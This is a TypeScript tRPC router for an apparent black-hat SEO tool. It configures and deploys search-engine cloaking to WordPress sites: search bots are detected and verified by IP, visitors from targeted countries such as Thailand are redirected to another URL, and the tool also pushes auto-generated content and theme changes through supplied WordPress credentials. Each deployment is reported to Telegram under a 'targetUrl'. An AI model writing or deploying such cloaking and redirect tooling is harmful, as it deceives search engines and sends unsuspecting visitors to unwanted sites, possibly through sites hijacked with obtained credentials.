/**
 * Cloaking + Advanced SEO Optimization Router
 * 
 * Endpoints for:
 * 1. Cloaking settings management (bot detection, Thai user redirect)
 * 2. AI on-page SEO optimization (full Google Algorithm compliance)
 * 3. SEO theme selection and deployment
 * 4. SEO audit and scoring
 */

import { z } from "zod";
import { router, protectedProcedure } from "../_core/trpc";
import {
  type CloakingConfig,
  DEFAULT_CLOAKING_CONFIG,
  SEARCH_ENGINE_BOTS,
  isSearchBot,
  identifyBot,
  isGoogleBotIp,
  generateCloakingPHP,
  generateCloakingJS,
  deployFullCloaking,
  type CloakingDeployResult,
} from "../wp-cloaking-engine";
import {
  type SeoOptimizationInput,
  type OptimizedPage,
  generateOptimizedPage,
  runSeoAudit,
  deployOptimizedPageToWP,
  optimizeWpSiteSettings,
  selectSeoTheme,
  SEO_OPTIMIZED_THEMES,
  generateHtaccessRules,
  generateRobotsTxt,
  type AuditInput,
} from "../ai-onpage-seo-optimizer";
import * as db from "../db";
import { sendTelegramNotification, type TelegramNotification } from "../telegram-notifier";

// ═══ In-memory cloaking configs per project ═══
const cloakingConfigs = new Map<number, CloakingConfig>();

// ═══ Cloaking Router ═══
export const cloakingRouter = router({
  /** Get cloaking config for a project */
  getConfig: protectedProcedure
    .input(z.object({ projectId: z.number() }))
    .query(({ input }) => {
      return cloakingConfigs.get(input.projectId) || { ...DEFAULT_CLOAKING_CONFIG };
    }),

  /** Update cloaking config */
  updateConfig: protectedProcedure
    .input(z.object({
      projectId: z.number(),
      config: z.object({
        redirectUrl: z.string().optional(),
        redirectUrls: z.array(z.string()).optional(),
        enabled: z.boolean().optional(),
        redirectMethod: z.enum(["js", "meta", "302", "301"]).optional(),
        redirectDelay: z.number().min(0).max(10000).optional(),
        targetCountries: z.array(z.string()).optional(),
        verifyBotIp: z.boolean().optional(),
        customBotHead: z.string().optional(),
        customRedirectHead: z.string().optional(),
      }),
    }))
    .mutation(({ input }) => {
      const existing = cloakingConfigs.get(input.projectId) || { ...DEFAULT_CLOAKING_CONFIG };
      const updated: CloakingConfig = {
        ...existing,
        ...input.config,
        allowedBots: existing.allowedBots, // keep default bots
      };
      cloakingConfigs.set(input.projectId, updated);
      return { success: true, config: updated };
    }),

  /** Deploy cloaking to a WordPress site */
  deploy: protectedProcedure
    .input(z.object({
      projectId: z.number(),
      domain: z.string(),
      wpUsername: z.string(),
      wpAppPassword: z.string(),
    }))
    .mutation(async ({ input }) => {
      const config = cloakingConfigs.get(input.projectId);
      if (!config || !config.enabled) {
        return { success: false, detail: "Cloaking not configured or disabled" };
      }

      const result = await deployFullCloaking(
        {
          siteUrl: input.domain.startsWith("http") ? input.domain : `https://${input.domain}`,
          username: input.wpUsername,
          appPassword: input.wpAppPassword,
        },
        config,
      );

      // Notify via Telegram
      if (result.success) {
        try {
          await sendTelegramNotification({
            type: "info",
            targetUrl: input.domain,
            details: `🕵️ Cloaking Deployed\n🌐 ${input.domain}\n🔀 Redirect: ${config.redirectUrl}\n🎯 Countries: ${config.targetCountries.join(", ")}\n📋 Method: ${config.redirectMethod}\n✅ ${result.methods.filter(m => m.success).length}/${result.methods.length} methods succeeded`,
          });
        } catch {}
      }

      return result;
    }),

  /** Generate cloaking code (PHP + JS) without deploying */
  generateCode: protectedProcedure
    .input(z.object({
      projectId: z.number(),
      format: z.enum(["php", "js", "both"]).default("both"),
    }))
    .query(({ input }) => {
      const config = cloakingConfigs.get(input.projectId) || { ...DEFAULT_CLOAKING_CONFIG };
      const result: { php?: string; js?: string } = {};
      
      if (input.format === "php" || input.format === "both") {
        result.php = generateCloakingPHP(config);
      }
      if (input.format === "js" || input.format === "both") {
        result.js = generateCloakingJS(config);
      }
      
      return result;
    }),

  /** Test bot detection */
  testBotDetection: protectedProcedure
    .input(z.object({
      userAgent: z.string(),
      ip: z.string().optional(),
    }))
    .query(({ input }) => {
      return {
        isBot: isSearchBot(input.userAgent),
        botName: identifyBot(input.userAgent),
        isGoogleIp: input.ip ? isGoogleBotIp(input.ip) : null,
      };
    }),

  /** Get list of supported bots */
  getSupportedBots: protectedProcedure.query(() => {
    return SEARCH_ENGINE_BOTS;
  }),
});

// ═══ On-Page SEO Optimizer Router ═══
export const onPageSeoRouter = router({
  /** Generate fully optimized page content */
  generateOptimized: protectedProcedure
    .input(z.object({
      domain: z.string(),
      primaryKeyword: z.string(),
      secondaryKeywords: z.array(z.string()).default([]),
      language: z.string().default("th"),
      country: z.string().default("TH"),
      niche: z.string(),
      brandName: z.string(),
      existingContent: z.string().optional(),
      authorName: z.string().optional(),
      authorCredentials: z.string().optional(),
      organizationName: z.string().optional(),
      logoUrl: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const seoInput: SeoOptimizationInput = {
        domain: input.domain,
        primaryKeyword: input.primaryKeyword,
        secondaryKeywords: input.secondaryKeywords,
        language: input.language,
        country: input.country,
        niche: input.niche,
        brandName: input.brandName,
        existingContent: input.existingContent,
        author: input.authorName ? {
          name: input.authorName,
          credentials: input.authorCredentials || "",
          bio: "",
        } : undefined,
        organization: input.organizationName ? {
          name: input.organizationName,
          logoUrl: input.logoUrl,
        } : undefined,
      };

      const result = await generateOptimizedPage(seoInput);

      // Notify via Telegram
      try {
        await sendTelegramNotification({
          type: "info",
          targetUrl: input.domain,
          details: `📝 AI SEO Content Generated\n🌐 ${input.domain}\n🎯 Keyword: ${input.primaryKeyword}\n📊 SEO Score: ${result.seoScore}/100\n📄 ${result.wordCount} words\n🏗️ ${result.schemas.length} schema types\n✅ ${result.seoChecks.filter(c => c.status === "pass").length}/${result.seoChecks.length} checks passed`,
        });
      } catch {}

      return result;
    }),

  /** Run SEO audit on existing content */
  audit: protectedProcedure
    .input(z.object({
      title: z.string(),
      metaDescription: z.string(),
      h1: z.string(),
      content: z.string(),
      slug: z.string(),
      primaryKeyword: z.string(),
      secondaryKeywords: z.array(z.string()).default([]),
      headings: z.array(z.object({ level: z.number(), text: z.string() })).default([]),
      schemas: z.array(z.any()).default([]),
      images: z.array(z.object({ alt: z.string(), src: z.string() })).default([]),
      internalLinks: z.array(z.object({ anchor: z.string(), url: z.string() })).default([]),
      authorName: z.string().optional(),
      authorCredentials: z.string().optional(),
    }))
    .query(({ input }) => {
      const wordCount = input.content.replace(/<[^>]*>/g, "").split(/\s+/).filter(Boolean).length;
      
      const auditInput: AuditInput = {
        title: input.title,
        metaDescription: input.metaDescription,
        h1: input.h1,
        headings: input.headings,
        content: input.content,
        slug: input.slug,
        primaryKeyword: input.primaryKeyword,
        secondaryKeywords: input.secondaryKeywords,
        schemas: input.schemas,
        images: input.images,
        internalLinks: input.internalLinks,
        wordCount,
        author: input.authorName ? { name: input.authorName, credentials: input.authorCredentials || "" } : undefined,
      };

      return runSeoAudit(auditInput);
    }),

  /** Deploy optimized content to WordPress */
  deployToWP: protectedProcedure
    .input(z.object({
      projectId: z.number(),
      domain: z.string(),
      wpUsername: z.string(),
      wpAppPassword: z.string(),
      primaryKeyword: z.string(),
      secondaryKeywords: z.array(z.string()).default([]),
      language: z.string().default("th"),
      niche: z.string(),
      brandName: z.string(),
      asPage: z.boolean().default(false),
      authorName: z.string().optional(),
      authorCredentials: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      // Step 1: Generate optimized content
      const seoInput: SeoOptimizationInput = {
        domain: input.domain,
        primaryKeyword: input.primaryKeyword,
        secondaryKeywords: input.secondaryKeywords,
        language: input.language,
        country: "TH",
        niche: input.niche,
        brandName: input.brandName,
        author: input.authorName ? {
          name: input.authorName,
          credentials: input.authorCredentials || "",
          bio: "",
        } : undefined,
      };

      const page = await generateOptimizedPage(seoInput);

      // Step 2: Deploy to WordPress
      const siteUrl = input.domain.startsWith("http") ? input.domain : `https://${input.domain}`;
      const deployResult = await deployOptimizedPageToWP(
        { siteUrl, username: input.wpUsername, appPassword: input.wpAppPassword },
        page,
        input.asPage,
      );

      // Step 3: Optimize site settings
      await optimizeWpSiteSettings(
        { siteUrl, username: input.wpUsername, appPassword: input.wpAppPassword },
        seoInput,
      );

      // Notify
      if (deployResult.success) {
        try {
          await sendTelegramNotification({
            type: "info",
            targetUrl: input.domain,
            details: `🚀 SEO Content Deployed to WP\n🌐 ${input.domain}\n🎯 ${input.primaryKeyword}\n📊 SEO Score: ${page.seoScore}/100\n📄 ${page.wordCount} words\n🔗 ${deployResult.url || "Published"}`,
          });
        } catch {}
      }

      return {
        ...deployResult,
        seoScore: page.seoScore,
        wordCount: page.wordCount,
        checksTotal: page.seoChecks.length,
        checksPassed: page.seoChecks.filter(c => c.status === "pass").length,
      };
    }),

  /** Generate .htaccess rules for SEO */
  getHtaccessRules: protectedProcedure.query(() => {
    return generateHtaccessRules();
  }),

  /** Generate robots.txt for a domain */
  getRobotsTxt: protectedProcedure
    .input(z.object({ domain: z.string(), sitemapUrl: z.string().optional() }))
    .query(({ input }) => {
      return generateRobotsTxt(input.domain, input.sitemapUrl);
    }),
});

// ═══ SEO Theme Router ═══
export const seoThemeRouter = router({
  /** List all SEO-optimized themes */
  list: protectedProcedure.query(() => {
    return SEO_OPTIMIZED_THEMES;
  }),

  /** Select best theme based on criteria */
  select: protectedProcedure
    .input(z.object({
      preferTier: z.number().min(1).max(4).optional(),
      minSpeedScore: z.number().min(0).max(100).optional(),
      requireSchema: z.boolean().optional(),
      randomize: z.boolean().default(false),
    }))
    .query(({ input }) => {
      return selectSeoTheme(input);
    }),

  /** Deploy selected theme to WordPress */
  deployTheme: protectedProcedure
    .input(z.object({
      domain: z.string(),
      wpUsername: z.string(),
      wpAppPassword: z.string(),
      themeSlug: z.string(),
    }))
    .mutation(async ({ input }) => {
      const siteUrl = input.domain.startsWith("http") ? input.domain : `https://${input.domain}`;
      const auth = Buffer.from(`${input.wpUsername}:${input.wpAppPassword}`).toString("base64");

      try {
        // Try to activate the theme
        const response = await fetch(
          `${siteUrl}/wp-json/wp/v2/themes/${input.themeSlug}`,
          {
            method: "PUT",
            headers: {
              Authorization: `Basic ${auth}`,
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ status: "active" }),
          },
        );

        if (!response.ok) {
          // Try POST method
          const altResponse = await fetch(
            `${siteUrl}/wp-json/wp/v2/themes/${input.themeSlug}`,
            {
              method: "POST",
              headers: {
                Authorization: `Basic ${auth}`,
                "Content-Type": "application/json",
              },
              body: JSON.stringify({ status: "active" }),
            },
          );

          if (!altResponse.ok) {
            const text = await altResponse.text();
            return { success: false, detail: `Cannot activate theme: ${text}` };
          }
        }

        return { success: true, detail: `Theme "${input.themeSlug}" activated` };
      } catch (err: any) {
        return { success: false, detail: `Error: ${err.message}` };
      }
    }),
});

// ═══ Full SEO + Cloaking Pipeline ═══
export const seoFullPipelineRouter = router({
  /** Run complete SEO optimization + cloaking pipeline for a project */
  runFullPipeline: protectedProcedure
    .input(z.object({
      projectId: z.number(),
      domain: z.string(),
      wpUsername: z.string(),
      wpAppPassword: z.string(),
      primaryKeyword: z.string(),
      secondaryKeywords: z.array(z.string()).default([]),
      niche: z.string(),
      brandName: z.string(),
      language: z.string().default("th"),
      // Cloaking settings
      cloakingEnabled: z.boolean().default(false),
      redirectUrl: z.string().optional(),
      redirectMethod: z.enum(["js", "meta", "302", "301"]).default("js"),
      targetCountries: z.array(z.string()).default(["TH"]),
    }))
    .mutation(async ({ input }) => {
      const siteUrl = input.domain.startsWith("http") ? input.domain : `https://${input.domain}`;
      const results: { step: string; success: boolean; detail: string; data?: any }[] = [];

      // Step 1: Select and deploy SEO theme
      try {
        const theme = selectSeoTheme({ preferTier: 1, randomize: true });
        const auth = Buffer.from(`${input.wpUsername}:${input.wpAppPassword}`).toString("base64");
        
        const themeRes = await fetch(`${siteUrl}/wp-json/wp/v2/themes/${theme.slug}`, {
          method: "PUT",
          headers: { Authorization: `Basic ${auth}`, "Content-Type": "application/json" },
          body: JSON.stringify({ status: "active" }),
        });
        
        results.push({
          step: "theme",
          success: themeRes.ok,
          detail: themeRes.ok ? `Activated: ${theme.name} (Speed: ${theme.speedScore})` : `Theme activation failed`,
          data: theme,
        });
      } catch (err: any) {
        results.push({ step: "theme", success: false, detail: err.message });
      }

      // Step 2: Generate and deploy optimized content
      try {
        const seoInput: SeoOptimizationInput = {
          domain: input.domain,
          primaryKeyword: input.primaryKeyword,
          secondaryKeywords: input.secondaryKeywords,
          language: input.language,
          country: "TH",
          niche: input.niche,
          brandName: input.brandName,
        };

        const page = await generateOptimizedPage(seoInput);
        const deployResult = await deployOptimizedPageToWP(
          { siteUrl, username: input.wpUsername, appPassword: input.wpAppPassword },
          page,
          true, // as page
        );

        results.push({
          step: "seo_content",
          success: deployResult.success,
          detail: `SEO Score: ${page.seoScore}/100, ${page.wordCount} words. ${deployResult.detail}`,
          data: { seoScore: page.seoScore, wordCount: page.wordCount, postId: deployResult.postId },
        });
      } catch (err: any) {
        results.push({ step: "seo_content", success: false, detail: err.message });
      }

      // Step 3: Optimize site settings
      try {
        const settingsResult = await optimizeWpSiteSettings(
          { siteUrl, username: input.wpUsername, appPassword: input.wpAppPassword },
          {
            domain: input.domain,
            primaryKeyword: input.primaryKeyword,
            secondaryKeywords: input.secondaryKeywords,
            language: input.language,
            country: "TH",
            niche: input.niche,
            brandName: input.brandName,
          },
        );
        results.push({ step: "site_settings", success: settingsResult.success, detail: settingsResult.detail });
      } catch (err: any) {
        results.push({ step: "site_settings", success: false, detail: err.message });
      }

      // Step 4: Deploy cloaking (if enabled)
      if (input.cloakingEnabled && input.redirectUrl) {
        try {
          const cloakConfig: CloakingConfig = {
            ...DEFAULT_CLOAKING_CONFIG,
            redirectUrl: input.redirectUrl,
            enabled: true,
            redirectMethod: input.redirectMethod,
            targetCountries: input.targetCountries,
          };

          // Save config
          cloakingConfigs.set(input.projectId, cloakConfig);

          const cloakResult = await deployFullCloaking(
            { siteUrl, username: input.wpUsername, appPassword: input.wpAppPassword },
            cloakConfig,
          );

          results.push({
            step: "cloaking",
            success: cloakResult.success,
            detail: `Cloaking ${cloakResult.success ? "deployed" : "failed"}. ${cloakResult.methods.filter(m => m.success).length}/${cloakResult.methods.length} methods.`,
            data: { methods: cloakResult.methods },
          });
        } catch (err: any) {
          results.push({ step: "cloaking", success: false, detail: err.message });
        }
      }

      // Telegram notification
      const successCount = results.filter(r => r.success).length;
      try {
        await sendTelegramNotification({
          type: "info",
          targetUrl: input.domain,
          details: `🔧 Full SEO Pipeline Complete\n🌐 ${input.domain}\n🎯 ${input.primaryKeyword}\n📊 ${successCount}/${results.length} steps succeeded\n` + results.map(r => `${r.success ? "✅" : "❌"} ${r.step}: ${r.detail.slice(0, 60)}`).join("\n"),
        });
      } catch {}

      return {
        success: successCount > 0,
        totalSteps: results.length,
        successSteps: successCount,
        results,
      };
    }),
});
